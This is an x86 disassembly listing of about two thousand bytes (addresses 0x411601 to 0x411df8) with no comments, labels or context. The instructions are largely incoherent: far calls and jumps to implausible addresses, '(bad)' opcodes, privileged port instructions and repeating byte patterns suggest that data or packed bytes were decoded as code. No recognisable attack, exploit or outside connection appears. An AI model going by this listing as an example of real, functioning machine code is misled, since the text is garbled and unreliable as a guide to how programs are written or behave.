  411601:	inc    eax
  411602:	add    eax,0x78434040
  411607:	bound  eax,QWORD PTR [ecx+0x78]
  41160a:	add    eax,0x62404043
  41160f:	and    eax,DWORD PTR [eax-0x78]
  411612:	fcomp  QWORD PTR [ebx+0x53]
  411615:	or     ch,BYTE PTR [ebp-0x1f]
  411618:	and    eax,0x4830c560
  41161d:	cmp    al,0xc0
  41161f:	enter  0x4452,0x45
  411623:	call   0x10078cf1
  411628:	rol    DWORD PTR [eax+0x34b47efe],0xa8
  41162f:	jg     0x411678
  411631:	and    al,0x44
  411633:	and    DWORD PTR [edi-0x3fed9ac0],ebp
  411639:	fs sub al,0x65
  41163c:	imul   eax,DWORD PTR [ecx+0x40],0x5
  411640:	inc    eax
  411641:	bound  eax,QWORD PTR [ebx+0x43]
  411644:	add    eax,0x62004040
  411649:	inc    eax
  41164a:	add    BYTE PTR [ecx+0x40],al
  41164d:	inc    ebx
  41164e:	test   BYTE PTR ds:0x58054041,ah
  411654:	inc    eax
  411655:	inc    eax
  411656:	bound  eax,QWORD PTR [eax+0x66]
  411659:	inc    ecx
  41165a:	inc    eax
  41165b:	add    eax,0xd5262000
  411660:	and    DWORD PTR [edx],eax
  411662:	ficomp DWORD PTR [ebx-0x52ed009d]
  411668:	inc    esp
  411669:	jl     0x411640
  41166b:	test   al,0xfe
  41166d:	fs inc ebp
  41166f:	cmp    eax,eax
  411671:	adc    edi,DWORD PTR [esi+0x4144ab4b]
  411677:	or     ch,BYTE PTR [esi-0x73]
  41167a:	sar    BYTE PTR [edi],cl
  41167c:	dec    esp
  41167d:	or     edx,DWORD PTR [eax+ecx*1]
  411680:	inc    eax
  411681:	adc    eax,0x6184402a
  411686:	int    0xb4
  411688:	je     0x4116a2
  41168a:	inc    esp
  41168b:	pop    edi
  41168c:	ret    
  41168d:	arpl   WORD PTR [eax+0x2d017170],si
  411693:	inc    ecx
  411694:	inc    edx
  411695:	add    BYTE PTR [eax],al
  411697:	inc    ebx
  411698:	inc    eax
  411699:	bound  eax,QWORD PTR ds:0x25404110
  41169f:	add    ah,cl
  4116a1:	inc    ebx
  4116a2:	add    eax,0x40402562
  4116a7:	add    BYTE PTR [eax+0x40],al
  4116aa:	inc    ecx
  4116ab:	inc    ecx
  4116ac:	add    eax,0x78434025
  4116b1:	bound  eax,QWORD PTR [eax-0x7c]
  4116b4:	inc    eax
  4116b5:	inc    ecx
  4116b6:	test   eax,0x534a530d
  4116bb:	fdivr  DWORD PTR [edi+0x3bcba827]
  4116c1:	rol    BYTE PTR [edi+0x14a428cd],0x44
  4116c8:	xchg   esp,eax
  4116c9:	and    al,BYTE PTR [eax-0x26]
  4116cc:	inc    ebp
  4116cd:	arpl   WORD PTR [ecx+0x40],ax
  4116d0:	inc    eax
  4116d1:	inc    ebx
  4116d2:	int3   
  4116d3:	add    BYTE PTR ds:0x56240,al
  4116d9:	inc    ebx
  4116da:	inc    eax
  4116db:	inc    eax
  4116dc:	add    BYTE PTR [ecx+0x62],al
  4116df:	bound  eax,QWORD PTR [eax]
  4116e1:	int3   
  4116e2:	inc    eax
  4116e3:	inc    ebx
  4116e4:	add    eax,0x43624041
  4116e9:	adc    BYTE PTR [ecx+0x5],al
  4116ec:	inc    eax
  4116ed:	into   
  4116ee:	inc    esi
  4116ef:	inc    esi
  4116f0:	dec    ebx
  4116f1:	add    al,0xd6
  4116f3:	inc    ebx
  4116f4:	jl     0x411758
  4116f6:	inc    ecx
  4116f7:	cmp    ecx,eax
  4116f9:	jo     0x41175f
  4116fb:	jo     0x411695
  4116fd:	mov    al,ds:0x40cb203c
  411702:	inc    esp
  411703:	mov    eax,0x73c0d3d
  411708:	bound  eax,QWORD PTR [ebx+0x40]
  41170b:	adc    BYTE PTR ds:0x4158cc40,al
  411711:	inc    ebx
  411712:	bound  eax,QWORD PTR [ecx+0x40]
  411715:	add    eax,0x4140
  41171a:	and    eax,0x40400062
  41171f:	add    eax,0x84404340
  411724:	int3   
  411725:	js     0x411727
  411727:	inc    ecx
  411728:	adc    BYTE PTR [edx+0xf],ah
  41172b:	into   
  41172c:	add    BYTE PTR [esp+eiz*2],ch
  41172f:	daa    
  411730:	leave  
  411731:	fcmovbe st,st(5)
  411733:	xor    bh,BYTE PTR [eax-0x2a]
  411736:	jo     0x411799
  411738:	inc    edx
  411739:	push   0x38
  41173b:	rcl    BYTE PTR [edx-0x3b],1
  41173e:	mov    al,0xa8
  411740:	inc    ecx
  411741:	xor    dh,BYTE PTR [edi]
  411743:	ror    BYTE PTR [ecx-0x3fee9d3e],0xcb
  41174a:	sbb    eax,0x4056567c
  41174f:	inc    ecx
  411750:	mov    al,0x35
  411752:	(bad)  
  411753:	sbb    cl,BYTE PTR [eax]
  411755:	fs inc ebx
  411757:	retf   
  411758:	gs jns 0x4116ef
  41175b:	shr    BYTE PTR [ebx+0x41684744],0x22
  411762:	add    BYTE PTR [eax+0x41],al
  411765:	inc    eax
  411766:	inc    ebx
  411767:	bound  ax,DWORD PTR ds:0x40434100
  41176e:	add    eax,0x40054062
  411773:	bound  eax,QWORD PTR [ecx+0x40]
  411776:	inc    ebx
  411777:	inc    eax
  411778:	add    eax,0x25405841
  41177d:	bound  eax,QWORD PTR [eax+0x43]
  411780:	inc    eax
  411781:	adc    al,cl
  411783:	les    esi,FWORD PTR [ecx+0x2c]
  411786:	test   eax,0x46462052
  41178b:	dec    ecx
  41178c:	data16 aam 0x94
  41178f:	bound  esp,QWORD PTR [eax+0x2c1cf2c]
  411795:	aad    0x42
  411797:	cmp    BYTE PTR ds:0x3ac2d3e7,al
  41179d:	inc    edi
  41179e:	aas    
  41179f:	arpl   WORD PTR [edi+0x407a404a],ax
  4117a5:	out    dx,al
  4117a6:	in     al,0x7c
  4117a8:	dec    ecx
  4117a9:	inc    eax
  4117aa:	inc    ecx
  4117ab:	inc    ebx
  4117ac:	inc    eax
  4117ad:	add    eax,0x43406262
  4117b2:	inc    ecx
  4117b3:	adc    BYTE PTR [eax],al
  4117b5:	inc    eax
  4117b6:	add    eax,0x43000562
  4117bb:	add    BYTE PTR [ecx+0x40],al
  4117be:	inc    eax
  4117bf:	add    eax,0x400062
  4117c4:	inc    ebx
  4117c5:	inc    eax
  4117c6:	js     0x411809
  4117c8:	inc    ecx
  4117c9:	bound  eax,QWORD PTR [eax-0x58]
  4117cc:	pusha  
  4117cd:	jle    0x4117f8
  4117cf:	inc    esp
  4117d0:	cmp    eax,0x40423328
  4117d5:	shl    DWORD PTR [esi+0x2c],0xc3
  4117d9:	adc    BYTE PTR [eax+0x2a],al
  4117dc:	inc    eax
  4117dd:	push   esp
  4117de:	adc    edx,0x41404246
  4117e4:	inc    eax
  4117e5:	shl    DWORD PTR [edx+0x40],0x5
  4117e9:	inc    ecx
  4117ea:	add    BYTE PTR [ebx+0x40],al
  4117ed:	inc    eax
  4117ee:	inc    ecx
  4117ef:	inc    eax
  4117f0:	inc    eax
  4117f1:	bound  eax,QWORD PTR ds:0x5624300
  4117f7:	add    BYTE PTR [eax+0x40],al
  4117fa:	add    BYTE PTR [ecx+0x43],al
  4117fd:	add    BYTE PTR [eax+0x41],al
  411800:	add    eax,0x40436200
  411805:	inc    eax
  411806:	add    eax,0x2cd4362
  41180b:	test   BYTE PTR [ecx+0x43],0x50
  41180f:	and    al,0x80
  411811:	or     al,BYTE PTR [edi+0x40794442]
  411817:	les    ebp,FWORD PTR [esi]
  411819:	(bad)  
  41181a:	arpl   WORD PTR [esi],si
  41181c:	jge    0x4117e6
  41181e:	inc    eax
  41181f:	ins    DWORD PTR es:[edi],dx
  411820:	push   es
  411821:	inc    esp
  411822:	inc    ecx
  411823:	inc    eax
  411824:	add    eax,0x41624340
  411829:	test   BYTE PTR [eax],al
  41182b:	and    eax,0x404043
  411830:	add    BYTE PTR ds:0x626210,al
  411836:	add    eax,0x43404140
  41183b:	inc    eax
  41183c:	inc    ecx
  41183d:	add    eax,0x10664062
  411842:	inc    ebx
  411843:	bound  ecx,QWORD PTR [esp+ebx*4+0x42]
  411847:	adc    eax,0x2c49ee40
  41184c:	aas    
  41184d:	push   0x4750dc80
  411852:	adc    al,0xdd
  411855:	xor    eax,ebx
  411857:	fs inc eax
  411859:	shl    BYTE PTR [esi],0xc5
  41185c:	push   edx
  41185d:	dec    esp
  41185e:	dec    edx
  41185f:	inc    eax
  411860:	inc    eax
  411861:	and    esi,DWORD PTR [ecx+0x60]
  411864:	popa   
  411865:	or     eax,0x4e40d263
  41186a:	add    eax,0x4041cc
  41186f:	add    BYTE PTR [eax],al
  411871:	inc    eax
  411872:	inc    eax
  411873:	inc    ebx
  411874:	bound  eax,QWORD PTR [eax]
  411876:	inc    eax
  411877:	inc    eax
  411878:	add    eax,0x62434162
  41187d:	inc    eax
  41187e:	js     0x411890
  411880:	inc    ecx
  411881:	add    eax,0x5404325
  411886:	bound  eax,QWORD PTR [eax+0x40]
  411889:	inc    ecx
  41188a:	inc    ebx
  41188b:	add    edi,esi
  41188d:	fnstcw WORD PTR [ebx+0x38]
  411890:	lds    edx,FWORD PTR [eax]
  411892:	les    eax,FWORD PTR [ebx]
  411894:	inc    esp
  411895:	loopne 0x4118d9
  411897:	arpl   WORD PTR [edi+0x40],cx
  41189a:	test   eax,0xd6dc2c01
  41189f:	leave  
  4118a0:	inc    ecx
  4118a1:	inc    eax
  4118a2:	jno    0x411914
  4118a4:	into   
  4118a5:	gs sbb al,0xaa
  4118a8:	dec    eax
  4118a9:	inc    eax
  4118aa:	rol    BYTE PTR [edi-0x6e9dff6c],0x25
  4118b1:	inc    ecx
  4118b2:	bound  eax,QWORD PTR [ebx+0x0]
  4118b5:	adc    BYTE PTR [eax+0x0],al
  4118b8:	add    eax,0x62410040
  4118bd:	inc    eax
  4118be:	add    BYTE PTR [ebx-0x34],al
  4118c1:	inc    eax
  4118c2:	add    eax,0x78434040
  4118c7:	bound  eax,QWORD PTR [ecx+0x78]
  4118ca:	add    eax,0x62404043
  4118cf:	cmp    eax,0x85623110
  4118d4:	dec    edi
  4118d5:	mov    ebp,0x4540c364
  4118da:	test   BYTE PTR [ebp+edi*4+0x60],al
  4118de:	adc    DWORD PTR [ebp+0x40],eax
  4118e1:	inc    eax
  4118e2:	sub    eax,0xf762712c
  4118e7:	js     0x41192a
  4118e9:	and    al,0x58
  4118eb:	int3   
  4118ec:	mov    eax,0xd08043c3
  4118f1:	jmp    0x413d:0xc9d74d01
  4118f8:	inc    eax
  4118f9:	add    eax,0x43436240
  4118fe:	add    eax,0x62004040
  411903:	inc    eax
  411904:	add    BYTE PTR [ecx+0x40],al
  411907:	inc    ebx
  411908:	test   BYTE PTR ds:0x58054041,ah
  41190e:	inc    eax
  41190f:	inc    eax
  411910:	bound  eax,QWORD PTR [eax+0x66]
  411913:	inc    ecx
  411914:	inc    eax
  411915:	add    eax,0xe7404000
  41191a:	std    
  41191b:	lea    ebx,[ebp+0x39]
  41191e:	or     BYTE PTR [ecx+0x40],bh
  411921:	inc    ecx
  411922:	jno    0x411968
  411924:	fs pop edx
  411926:	(bad)  
  411928:	inc    eax
  411929:	arpl   WORD PTR [ecx],cx
  41192b:	sub    al,0x79
  41192d:	pusha  
  41192e:	bound  eax,QWORD PTR ss:[eax+0x46]
  411932:	add    BYTE PTR [eax],al
  411934:	inc    ebx
  411935:	inc    eax
  411936:	bound  eax,QWORD PTR ds:0x25404110
  41193c:	add    ah,cl
  41193e:	inc    ebx
  41193f:	add    eax,0x40402562
  411944:	add    BYTE PTR [eax+0x40],al
  411947:	inc    ecx
  411948:	inc    ecx
  411949:	add    eax,0x78434025
  41194e:	bound  eax,QWORD PTR [eax-0x7c]
  411951:	inc    eax
  411952:	inc    ecx
  411953:	pop    esi
  411954:	retf   0x20e8
  411957:	add    DWORD PTR ds:[eax+0x33],eax
  41195b:	retf   
  41195c:	lds    esp,FWORD PTR [ebx+0x63]
  41195f:	in     eax,0xd4
  411961:	rcl    DWORD PTR [ecx+0x4c],1
  411964:	inc    ebp
  411965:	inc    edi
  411966:	push   esi
  411967:	push   edx
  411968:	outs   dx,BYTE PTR ds:[esi]
  411969:	inc    eax
  41196a:	inc    ebx
  41196b:	(bad)  
  41196c:	(bad)  
  41196d:	fisub  DWORD PTR [eax+ebx*2]
  411970:	les    eax,FWORD PTR [eax+0x41]
  411973:	jae    0x4119b9
  411975:	fld    DWORD PTR [ecx+0x40]
  411978:	inc    eax
  411979:	inc    ebx
  41197a:	int3   
  41197b:	add    BYTE PTR ds:0x56240,al
  411981:	inc    ebx
  411982:	inc    eax
  411983:	inc    eax
  411984:	add    BYTE PTR [ecx+0x62],al
  411987:	bound  eax,QWORD PTR [eax]
  411989:	int3   
  41198a:	inc    eax
  41198b:	inc    ebx
  41198c:	add    eax,0x43624041
  411991:	adc    BYTE PTR [ecx+0x5],al
  411994:	inc    eax
  411995:	stos   DWORD PTR es:[edi],eax
  411996:	add    cl,BYTE PTR [edi+0x40]
  411999:	inc    eax
  41199a:	inc    eax
  41199b:	sub    al,0x25
  41199d:	add    ebx,ecx
  41199f:	dec    esi
  4119a0:	aas    
  4119a1:	xor    edi,DWORD PTR [edx-0x38]
  4119a4:	xor    al,0xa9
  4119a6:	aas    
  4119a7:	xchg   DWORD PTR [eax+0x67],eax
  4119aa:	jns    0x411981
  4119ac:	inc    esp
  4119ad:	gs das 
  4119af:	pop    esp
  4119b0:	inc    eax
  4119b1:	inc    ecx
  4119b2:	rol    BYTE PTR [edi-0xc],0x7
  4119b6:	push   edx
  4119b7:	ds inc eax
  4119b9:	push   ebx
  4119ba:	cs out dx,al
  4119bc:	addr16 nop
  4119be:	or     eax,0xa2403c78
  4119c3:	bound  eax,QWORD PTR [ebx+0x40]
  4119c6:	adc    BYTE PTR ds:0x4158cc40,al
  4119cc:	inc    ebx
  4119cd:	bound  eax,QWORD PTR [ecx+0x40]
  4119d0:	add    eax,0x4140
  4119d5:	and    eax,0x40400062
  4119da:	add    eax,0x84404340
  4119df:	int3   
  4119e0:	js     0x4119e2
  4119e2:	inc    ecx
  4119e3:	adc    BYTE PTR [edx+0xf],ah
  4119e6:	inc    esp
  4119e7:	test   al,0x29
  4119e9:	loop   0x4119ad
  4119eb:	inc    eax
  4119ec:	fsubr  QWORD PTR [edx+edx*1]
  4119f0:	xor    al,0xb9
  4119f2:	pop    ebp
  4119f3:	inc    eax
  4119f4:	and    edx,eax
  4119f6:	(bad)  
  4119f7:	push   ecx
  4119f8:	lods   al,BYTE PTR ds:[esi]
  4119f9:	bound  ecx,QWORD PTR [eax+eax*2-0x3432dbe3]
  411a00:	into   
  411a01:	add    ebx,eax
  411a03:	add    BYTE PTR cs:[eax+0x41],al
  411a07:	inc    eax
  411a08:	inc    ebx
  411a09:	bound  ax,DWORD PTR ds:0x40434100
  411a10:	add    eax,0x40054062
  411a15:	bound  eax,QWORD PTR [ecx+0x40]
  411a18:	inc    ebx
  411a19:	inc    eax
  411a1a:	add    eax,0x25405841
  411a1f:	bound  eax,QWORD PTR [eax+0x43]
  411a22:	inc    eax
  411a23:	adc    BYTE PTR [edi+esi*2+0x41],al
  411a27:	dec    esp
  411a28:	and    al,0x38
  411a2a:	cmp    al,0x40
  411a2c:	sub    al,0xc0
  411a2e:	out    dx,al
  411a2f:	or     eax,0x40475284
  411a34:	dec    ecx
  411a35:	xor    BYTE PTR [ebx+ecx*8-0xb],al
  411a39:	les    eax,FWORD PTR [eax+0x40]
  411a3c:	inc    eax
  411a3d:	push   ecx
  411a3e:	sub    al,0x61
  411a40:	ret    0x694f
  411a43:	inc    eax
  411a44:	inc    ecx
  411a45:	inc    ebx
  411a46:	inc    eax
  411a47:	add    eax,0x43406262
  411a4c:	inc    ecx
  411a4d:	adc    BYTE PTR [eax],al
  411a4f:	inc    eax
  411a50:	add    eax,0x43000562
  411a55:	add    BYTE PTR [ecx+0x40],al
  411a58:	inc    eax
  411a59:	add    eax,0x400062
  411a5e:	inc    ebx
  411a5f:	inc    eax
  411a60:	js     0x411aa3
  411a62:	inc    ecx
  411a63:	bound  eax,QWORD PTR [eax+0x40]
  411a66:	xor    al,0xc2
  411a68:	les    esi,FWORD PTR [esi+ecx*8]
  411a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6c:	dec    esp
  411a6d:	xlat   BYTE PTR ds:[ebx]
  411a6e:	pop    ds
  411a6f:	cmp    BYTE PTR [ebp-0x80],cl
  411a72:	mov    ds:0x42a2c805,al
  411a77:	sub    BYTE PTR [ebp+0x157b63c5],cl
  411a7d:	out    0x24,eax
  411a7f:	rol    BYTE PTR [ecx+ecx*2-0x54],0xb0
  411a84:	xor    BYTE PTR ds:0x622c7157,0x40
  411a8b:	add    eax,0x40430041
  411a90:	inc    eax
  411a91:	inc    ecx
  411a92:	inc    eax
  411a93:	inc    eax
  411a94:	bound  eax,QWORD PTR ds:0x5624300
  411a9a:	add    BYTE PTR [eax+0x40],al
  411a9d:	add    BYTE PTR [ecx+0x43],al
  411aa0:	add    BYTE PTR [eax+0x41],al
  411aa3:	add    eax,0x40436200
  411aa8:	inc    eax
  411aa9:	add    eax,0x5055262
  411aae:	gs sub eax,0xc8c2ea41
  411ab4:	leave  
  411ab5:	retf   
  411ab6:	push   ss
  411ab7:	mov    ss,WORD PTR ds:0xa026d540
  411abd:	dec    eax
  411abe:	ins    BYTE PTR es:[edi],dx
  411abf:	inc    ecx
  411ac0:	inc    eax
  411ac1:	add    eax,0x41624340
  411ac6:	test   BYTE PTR [eax],al
  411ac8:	and    eax,0x404043
  411acd:	add    BYTE PTR ds:0x626210,al
  411ad3:	add    eax,0x43404140
  411ad8:	inc    eax
  411ad9:	inc    ecx
  411ada:	add    eax,0x10664062
  411adf:	inc    ebx
  411ae0:	bound  eax,QWORD PTR [ecx-0x66b885b7]
  411ae6:	xchg   ecx,eax
  411ae7:	adc    eax,0x6440773e
  411aec:	out    dx,al
  411aed:	test   al,0x4c
  411aef:	leave  
  411af0:	(bad)  
  411af1:	push   edx
  411af2:	daa    
  411af3:	rol    BYTE PTR [eax+edx*1+0x5],0x48
  411af8:	push   0xffffffd4
  411afa:	inc    eax
  411afb:	xor    al,0x2c
  411afd:	inc    edx
  411afe:	retf   
  411aff:	dec    ecx
  411b00:	dec    ebx
  411b01:	and    DWORD PTR fs:[ebx-0x40],ecx
  411b05:	inc    edx
  411b06:	inc    ebp
  411b07:	sub    eax,eax
  411b09:	sub    bl,BYTE PTR [ecx-0x3e]
  411b0c:	int    0x62
  411b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b0f:	add    BYTE PTR [edx],bh
  411b11:	xchg   esi,eax
  411b12:	inc    edx
  411b13:	aaa    
  411b14:	leave  
  411b15:	add    eax,0x4041cc
  411b1a:	add    BYTE PTR [eax],al
  411b1c:	inc    eax
  411b1d:	inc    eax
  411b1e:	inc    ebx
  411b1f:	bound  eax,QWORD PTR [eax]
  411b21:	inc    eax
  411b22:	inc    eax
  411b23:	add    eax,0x62434162
  411b28:	inc    eax
  411b29:	js     0x411b3b
  411b2b:	inc    ecx
  411b2c:	add    eax,0x5404325
  411b31:	bound  eax,QWORD PTR [eax+0x40]
  411b34:	inc    ecx
  411b35:	inc    ebx
  411b36:	sub    BYTE PTR [edx+eiz*2+0x5325d9bc],al
  411b3d:	es jae 0x411ba3
  411b40:	adc    eax,0xcf1f6f62
  411b45:	inc    ecx
  411b46:	pusha  
  411b47:	dec    esp
  411b48:	and    BYTE PTR [eax-0x3d],al
  411b4b:	inc    ecx
  411b4c:	dec    ebp
  411b4d:	mov    ebp,ebx
  411b4f:	mov    esp,0x572b9ba8
  411b54:	rcl    BYTE PTR [eax],0x63
  411b57:	push   edx
  411b58:	dec    ebx
  411b59:	and    DWORD PTR [edi],edi
  411b5b:	inc    eax
  411b5c:	imul   esp,DWORD PTR [edx+0x25],0xffffff87
  411b60:	xor    eax,0x29cb6905
  411b65:	inc    esp
  411b66:	call   0x43a35c90
  411b6b:	add    BYTE PTR [eax],dl
  411b6d:	inc    eax
  411b6e:	add    BYTE PTR ds:0x62410040,al
  411b74:	inc    eax
  411b75:	add    BYTE PTR [ebx-0x34],al
  411b78:	inc    eax
  411b79:	add    eax,0x78434040
  411b7e:	bound  eax,QWORD PTR [ecx+0x78]
  411b81:	add    eax,0x62404043
  411b86:	cmp    al,0x42
  411b88:	xchg   DWORD PTR [eax+0x2e],ebp
  411b8b:	jne    0x411bb9
  411b8d:	or     eax,0x6f475671
  411b92:	popa   
  411b93:	sar    DWORD PTR [esi],0xc6
  411b96:	jg     0x411bd4
  411b98:	gs loope 0x411bdc
  411b9b:	inc    ebp
  411b9c:	lds    ebp,FWORD PTR [ecx]
  411b9e:	and    BYTE PTR [eax-0x3f9a26c1],dh
  411ba4:	cdq    
  411ba5:	push   0xc1840d7e
  411baa:	inc    eax
  411bab:	jp     0x411b9b
  411bad:	mov    ah,cl
  411baf:	leave  
  411bb0:	ret    
  411bb1:	xchg   DWORD PTR [esi+0x40054041],ebp
  411bb7:	bound  eax,QWORD PTR [ebx+0x43]
  411bba:	add    eax,0x62004040
  411bbf:	inc    eax
  411bc0:	add    BYTE PTR [ecx+0x40],al
  411bc3:	inc    ebx
  411bc4:	test   BYTE PTR ds:0x58054041,ah
  411bca:	inc    eax
  411bcb:	inc    eax
  411bcc:	bound  eax,QWORD PTR [eax+0x66]
  411bcf:	inc    ecx
  411bd0:	inc    eax
  411bd1:	add    eax,0x64447b00
  411bd6:	gs dec eax
  411bd8:	and    DWORD PTR [edx-0x33d337c0],ecx
  411bde:	push   esp
  411bdf:	inc    ecx
  411be0:	cli    
  411be1:	and    DWORD PTR es:[ebp+0x3c],ebp
  411be5:	push   0xff5f
  411bea:	inc    ebx
  411beb:	inc    eax
  411bec:	bound  eax,QWORD PTR ds:0x25404110
  411bf2:	add    ah,cl
  411bf4:	inc    ebx
  411bf5:	add    eax,0x40402562
  411bfa:	add    BYTE PTR [eax+0x40],al
  411bfd:	inc    ecx
  411bfe:	inc    ecx
  411bff:	add    eax,0x78434025
  411c04:	bound  eax,QWORD PTR [eax-0x7c]
  411c07:	inc    eax
  411c08:	inc    ecx
  411c09:	bound  esp,QWORD PTR [edi+ecx*2-0x33]
  411c0d:	dec    ebp
  411c0e:	gs fucom st(0)
  411c11:	test   al,0xae
  411c13:	inc    eax
  411c14:	ret    
  411c15:	lea    ecx,[esp+eax*2+0x62]
  411c19:	inc    edx
  411c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c1b:	xor    BYTE PTR [esi+0x44],ah
  411c1e:	inc    eax
  411c1f:	inc    esp
  411c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c21:	sub    bh,dl
  411c23:	and    al,dl
  411c25:	sub    al,0x11
  411c27:	jbe    0x411c67
  411c29:	and    BYTE PTR [ebp+eiz*2+0x416b3a2b],ch
  411c30:	inc    eax
  411c31:	inc    eax
  411c32:	inc    ebx
  411c33:	int3   
  411c34:	add    BYTE PTR ds:0x56240,al
  411c3a:	inc    ebx
  411c3b:	inc    eax
  411c3c:	inc    eax
  411c3d:	add    BYTE PTR [ecx+0x62],al
  411c40:	bound  eax,QWORD PTR [eax]
  411c42:	int3   
  411c43:	inc    eax
  411c44:	inc    ebx
  411c45:	add    eax,0x43624041
  411c4a:	adc    BYTE PTR [ecx+0x5],al
  411c4d:	inc    eax
  411c4e:	and    bl,ch
  411c50:	pop    es
  411c51:	sub    eax,0xcdcd2241
  411c56:	dec    eax
  411c57:	push   ebx
  411c58:	bound  ebx,QWORD PTR [ecx]
  411c5a:	sub    eax,0x62a8425b
  411c5f:	pushf  
  411c60:	pop    ecx
  411c61:	fs inc ecx
  411c63:	shl    DWORD PTR [edx+0x43],0x40
  411c67:	adc    BYTE PTR ds:0x4158cc40,al
  411c6d:	inc    ebx
  411c6e:	bound  eax,QWORD PTR [ecx+0x40]
  411c71:	add    eax,0x4140
  411c76:	and    eax,0x40400062
  411c7b:	add    eax,0x84404340
  411c80:	int3   
  411c81:	js     0x411c83
  411c83:	inc    ecx
  411c84:	adc    BYTE PTR [edx+0xf],ah
  411c87:	(bad)  
  411c88:	adc    BYTE PTR [eax+0x5b073415],bh
  411c8e:	xor    eax,DWORD PTR [esp+edi*4+0x7f]
  411c92:	retf   
  411c93:	dec    esp
  411c94:	mov    ds:0x412cc342,eax
  411c99:	test   DWORD PTR [edx+esi*1+0x38112cd7],ebx
  411ca0:	push   0xe1a14152
  411ca5:	inc    eax
  411ca6:	rol    BYTE PTR [eax],0x40
  411ca9:	inc    ecx
  411caa:	inc    eax
  411cab:	inc    ebx
  411cac:	bound  ax,DWORD PTR ds:0x40434100
  411cb3:	add    eax,0x40054062
  411cb8:	bound  eax,QWORD PTR [ecx+0x40]
  411cbb:	inc    ebx
  411cbc:	inc    eax
  411cbd:	add    eax,0x25405841
  411cc2:	bound  eax,QWORD PTR [eax+0x43]
  411cc5:	inc    eax
  411cc6:	adc    BYTE PTR [eax-0x54],cl
  411cc9:	dec    eax
  411cca:	ror    DWORD PTR ds:[edx],0x29
  411cce:	aaa    
  411ccf:	popf   
  411cd0:	bound  esi,QWORD PTR [edx-0x24]
  411cd3:	dec    esp
  411cd4:	das    
  411cd5:	pusha  
  411cd6:	pop    ebx
  411cd7:	inc    esp
  411cd8:	(bad)  
  411cd9:	lds    edx,FWORD PTR [ebx+0xd]
  411cdc:	xchg   ebx,eax
  411cdd:	pop    ecx
  411cde:	shr    BYTE PTR [eax+ecx*8],0x63
  411ce2:	test   al,0xcb
  411ce4:	push   esp
  411ce5:	mov    al,ds:0xe1673624
  411cea:	or     ah,BYTE PTR [edi+0x2e]
  411ced:	inc    eax
  411cee:	push   esp
  411cef:	aad    0x42
  411cf1:	pusha  
  411cf2:	cmp    eax,0x414003ab
  411cf7:	inc    ebx
  411cf8:	inc    eax
  411cf9:	add    eax,0x43406262
  411cfe:	inc    ecx
  411cff:	adc    BYTE PTR [eax],al
  411d01:	inc    eax
  411d02:	add    eax,0x43000562
  411d07:	add    BYTE PTR [ecx+0x40],al
  411d0a:	inc    eax
  411d0b:	add    eax,0x400062
  411d10:	inc    ebx
  411d11:	inc    eax
  411d12:	js     0x411d55
  411d14:	inc    ecx
  411d15:	bound  eax,QWORD PTR [eax+0x33]
  411d18:	rcl    BYTE PTR [eax+0x34],0x25
  411d1c:	arpl   WORD PTR [edi+eiz*8-0x1d11caaf],di
  411d23:	out    dx,al
  411d24:	mov    eax,DWORD PTR ds:0x4435404c
  411d2a:	(bad)  
  411d2b:	clc    
  411d2c:	cmp    al,0xcb
  411d2e:	sub    al,0x6c
  411d30:	inc    eax
  411d31:	sub    al,0xc5
  411d33:	bound  eax,QWORD PTR [eax+0x5]
  411d36:	inc    ecx
  411d37:	add    BYTE PTR [ebx+0x40],al
  411d3a:	inc    eax
  411d3b:	inc    ecx
  411d3c:	inc    eax
  411d3d:	inc    eax
  411d3e:	bound  eax,QWORD PTR ds:0x5624300
  411d44:	add    BYTE PTR [eax+0x40],al
  411d47:	add    BYTE PTR [ecx+0x43],al
  411d4a:	add    BYTE PTR [eax+0x41],al
  411d4d:	add    eax,0x40436200
  411d52:	inc    eax
  411d53:	add    eax,0x45455262
  411d58:	icebp  
  411d59:	inc    eax
  411d5a:	das    
  411d5b:	xor    al,0x64
  411d5d:	stc    
  411d5e:	push   ebp
  411d5f:	xor    eax,0xcd543a85
  411d64:	add    DWORD PTR [eax+0x3e],eax
  411d67:	or     BYTE PTR [edi+ecx*2-0x3e],0x4a
  411d6c:	adc    BYTE PTR [edx-0x34],dl
  411d6f:	lds    eax,FWORD PTR [ecx+0x40]
  411d72:	add    eax,0x41624340
  411d77:	test   BYTE PTR [eax],al
  411d79:	and    eax,0x404043
  411d7e:	add    BYTE PTR ds:0x626210,al
  411d84:	add    eax,0x43404140
  411d89:	inc    eax
  411d8a:	inc    ecx
  411d8b:	add    eax,0x10664062
  411d90:	inc    ebx
  411d91:	bound  esp,QWORD PTR [edx+0x41]
  411d94:	sub    ebp,esi
  411d96:	sub    al,0x50
  411d98:	push   edx
  411d99:	dec    ebx
  411d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9b:	inc    ebx
  411d9c:	pop    eax
  411d9d:	dec    eax
  411d9e:	sub    cl,cl
  411da0:	adc    eax,0xc0400d45
  411da5:	cmp    al,0x92
  411da7:	es ror ah,cl
  411daa:	bound  esp,QWORD PTR [ebx+0x21]
  411dad:	add    eax,0x4041cc
  411db2:	add    BYTE PTR [eax],al
  411db4:	inc    eax
  411db5:	inc    eax
  411db6:	inc    ebx
  411db7:	bound  eax,QWORD PTR [eax]
  411db9:	inc    eax
  411dba:	inc    eax
  411dbb:	add    eax,0x62434162
  411dc0:	inc    eax
  411dc1:	js     0x411dd3
  411dc3:	inc    ecx
  411dc4:	add    eax,0x5404325
  411dc9:	bound  eax,QWORD PTR [eax+0x40]
  411dcc:	inc    ecx
  411dcd:	inc    ebx
  411dce:	xor    al,BYTE PTR [edx+0x48]
  411dd1:	test   al,0x6b
  411dd3:	inc    eax
  411dd4:	xor    eax,DWORD PTR [ebp+eax*8+0x62]
  411dd8:	inc    ecx
  411dd9:	inc    eax
  411dda:	add    ch,bh
  411ddc:	pop    edi
  411ddd:	shl    cl,0x2c
  411de0:	push   cs
  411de1:	inc    eax
  411de2:	fs inc edx
  411de4:	inc    eax
  411de5:	push   ebp
  411de6:	into   
  411de7:	pop    esp
  411de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411de9:	inc    eax
  411dea:	retf   0x4125
  411ded:	bound  eax,QWORD PTR [ebx+0x0]
  411df0:	adc    BYTE PTR [eax+0x0],al
  411df3:	add    eax,0x62410040
  411df8:	inc    eax
